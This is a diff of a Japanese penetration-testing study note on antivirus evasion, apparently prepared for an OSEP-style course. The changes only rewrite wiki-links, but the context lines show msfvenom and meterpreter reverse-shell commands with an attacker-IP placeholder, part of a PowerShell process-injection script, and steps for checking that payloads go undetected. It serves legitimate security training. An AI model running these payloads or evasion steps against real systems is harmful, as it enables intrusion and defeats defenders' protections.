@@ -7,15 +7,15 @@
 
 - [ ] 以下、OSEP受験時にまとめる
 - 関連ノート：
-	- [[4. Introduction to Antivirus]]
-	- [[5. AV Evasion：Shellcode]]
+	- [4. Introduction to Antivirus](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/4.%20Introduction%20to%20Antivirus.md)
+	- [5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md)
 
 ---
 
 # In-Memory Evasion（メモリ回避）
 
 メモリ回避とは、ファイルをディスクに書き込まず、すべての処理を揮発性メモリ（RAM）内で完結させることで、ウイルス対策製品の検出を避ける手法。
-([[5. AV Evasion：Shellcode]]で解説しているPackerなどはOn-Disk Evasionで、ディスク上の活動を検知されないようにするもの)
+([5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md)で解説しているPackerなどはOn-Disk Evasionで、ディスク上の活動を検知されないようにするもの)
 
 ## 特徴
 
@@ -50,7 +50,7 @@
 | 比較項目     | On-Disk Evasion                                   | In-Memory Evasion            |
 | -------- | ------------------------------------------------- | ---------------------------- |
 | ファイルの扱い  | ファイルを難読化・暗号化して**ディスク上に保存**                        | ファイルを一切書き込まず、**メモリ上で展開・実行**  |
-| 主な検出回避手段 | パッカー、エンコーダ、スタブ、署名改変など：[[5. AV Evasion：Shellcode]] | メモリ空間の操作やプロセス注入              |
+| 主な検出回避手段 | パッカー、エンコーダ、スタブ、署名改変など：[5. AV Evasion：Shellcode](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/5.%20AV%20Evasion：Shellcode.md) | メモリ空間の操作やプロセス注入              |
 | 対策されやすさ  | 静的検知（シグネチャ）やヒューリスティックで検出されやすい                     | メモリスキャンが必要なため検出が困難           |
 | AVの防御対象  | ファイルシステム（on-access scan）                          | 実行中のプロセスやメモリ空間（runtime scan） |
 
@@ -101,7 +101,7 @@ $$WindowsDefenderのサンプル自動提供の無効化$$
 
 - Windows Defenderのクラウド保護やサンプル自動送信は、インターネット接続が前提。
 - 実際のターゲット環境でクラウド保護が有効かどうかは、インフラポリシー次第。
-	- [[4. Introduction to Antivirus#Detection techniques]]
+	- [4. Introduction to Antivirus](../TryHackME/Red%20Teaming/4.%20Host%20Evasions/4.%20Introduction%20to%20Antivirus.md#Detection%20techniques)
 - 一部の本番サーバでは外部接続が制限されており、ML検知など、高度なAV機能が使われていない場合もある。
 
 ---
@@ -182,7 +182,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[Port] -f psh-ref
 
 ### 3.最終構成コード
 
-1. [[#1. リモートプロセスインジェクションのテンプレートスクリプト]]の`<place shellcode here>`に[[#2. シェルコード生成]]で生成したシェルコードを注入する。
+1. [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#1.%20リモートプロセスインジェクションのテンプレートスクリプト)の`<place shellcode here>`に[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#2.%20シェルコード生成)で生成したシェルコードを注入する。
 ```powershell
 $code = '
 [DllImport("kernel32.dll")]
@@ -224,7 +224,7 @@ function xb {
 
 #### 検知されないことを確認
 
-- ターゲット環境のAVソフトで検知があがらないことを確認するため、[[#理想的なAV回避テスト環境]]もしくは[[#Kleenscanの活用]]をし、検知されないことを確認する
+- ターゲット環境のAVソフトで検知があがらないことを確認するため、[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#理想的なAV回避テスト環境)もしくは[Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#Kleenscanの活用)をし、検知されないことを確認する
 - 以下はVirusTotalの画面だが、今回のテストで使用しているAviraは検知ベンダーに記載なし
 ![[Pasted image 20250702122439.png]]
 $$VirusTotalでAviraは検知していない$$
@@ -305,7 +305,7 @@ sudo rlwrap nc -lvnp 4444
 
 ##### 補足：PowerShellワンライナー
 
-- [[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
+- [What is the shell](../Cheatsheet/Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
 - この方法では、psファイルを保存する必要もないので、ファイルベースのスキャンに引っ掛かりにくいなどのメリットがある
 	- 一方で、psファイルは複数回実行が必要なスクリプトなどに向いている。
 
@@ -314,7 +314,7 @@ sudo rlwrap nc -lvnp 4444
 - ps1ファイルをターゲットユーザーにダブルクリックさせても、スクリプトがメモ帳で開かれるだけで実行はされない
 - 上述のように、PowerShellを開かせ、`\bypass.ps1`とさせる必要がある
 - 通常、ターゲットユーザーにpsスクリプトをPowerShellで実行させることは難しい
-	- → [[#Veil-frameworkを使ったAV evasion]]
+	- → [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#Veil-frameworkを使ったAV%20evasion)
 
 ---
 ---
@@ -343,7 +343,7 @@ sudo rlwrap nc -lvnp 4444
 sudo apt install shellter
 ```
 
-2. wineのインストール：参照→[[Module 14：Fixing Exploits#クロスコンパイル環境の準備・実行]]
+2. wineのインストール：参照→[Module 14：Fixing Exploits](Module%2014：Fixing%20Exploits.md#クロスコンパイル環境の準備・実行)
 	- Shelterがwindows用アプリケーションなため
 
 3. インストールの確認
@@ -406,7 +406,7 @@ $$Verification Stage$$
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
 ```
 
-7. [[ファイル操作、ユーティリティ#ファイルの転送]]でターゲットのWindowsマシンに転送
+7. [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
 8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得
 
 ---
@@ -415,7 +415,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 
 - [Veil-framwork - GitHub](https://github.com/Veil-Framework/Veil)は、一般的なAVをバイパスするmetasploitペイロードを生成するために設計されたツール
 	- ==msfvenomのエンコードだけではバイパスは難しい==
-- [[#🚨.ps1ファイルの欠点]]のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。
+- [Module 16：Antivirus Evasion](Module%2016：Antivirus%20Evasion.md#🚨.ps1ファイルの欠点)のように、ユーザーにPowerShellを開かせてps1ファイルを実行させる必要がないことがメリット。
 
 1. インストール
 ```zsh
@@ -480,5 +480,5 @@ generate
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [AttackerIP];set LPORT [Port];run;"
 ```
 
-7. [[ファイル操作、ユーティリティ#ファイルの転送]]でターゲットのWindowsマシンに転送
+7. [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#ファイルの転送)でターゲットのWindowsマシンに転送
 8. ターゲット上のAVでスキャンをし、悪意あるPEファイルが検知されないことを確認できたら、PEファイルを実行→シェル獲得
